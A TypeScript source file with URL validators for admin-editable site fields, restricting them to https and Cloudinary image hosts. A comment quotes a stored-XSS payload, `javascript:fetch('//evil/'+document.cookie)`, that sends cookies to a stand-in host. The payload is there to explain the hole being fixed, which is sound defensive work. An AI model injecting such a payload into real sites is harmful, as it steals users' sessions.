/**
 * Shared URL predicates for anything staff can save and the site later renders.
 *
 * Fields like these are rendered straight into an `href` (Footer,
 * FooterContactIcons) or an `<Image src>`, and they are editable from /admin.
 * Untyped `z.string()` therefore accepted
 * `javascript:fetch('//evil/'+document.cookie)` and stored XSS on every page of
 * the site, including the pages an OWNER visits — a staff-to-owner escalation.
 *
 * Empty stays valid: these fields are all optional and each renderer hides
 * itself when the value is blank.
 */
export function isHttpsUrl(val: string | null | undefined) {
  if (!val) return true;
  try {
    return new URL(val).protocol === "https:";
  } catch {
    return false;
  }
}

/**
 * Image fields additionally have to be a Cloudinary URL, because
 * next.config.ts `remotePatterns` allows only res.cloudinary.com. A foreign
 * host used to save fine and then throw inside next/image at render time —
 * a broken page instead of a rejected form. Host check mirrors
 * parsePublicId in src/lib/cloudinary.ts.
 */
export function cloudinaryImageUrl(val: string | null | undefined) {
  if (!val) return true;
  try {
    const parsed = new URL(val);
    return parsed.protocol === "https:" && parsed.hostname === "res.cloudinary.com";
  } catch {
    return false;
  }
}

export const HTTPS_MESSAGE = "Enter a full https:// link";
export const IMAGE_MESSAGE =
  "Use the upload button — images must be https://res.cloudinary.com links";
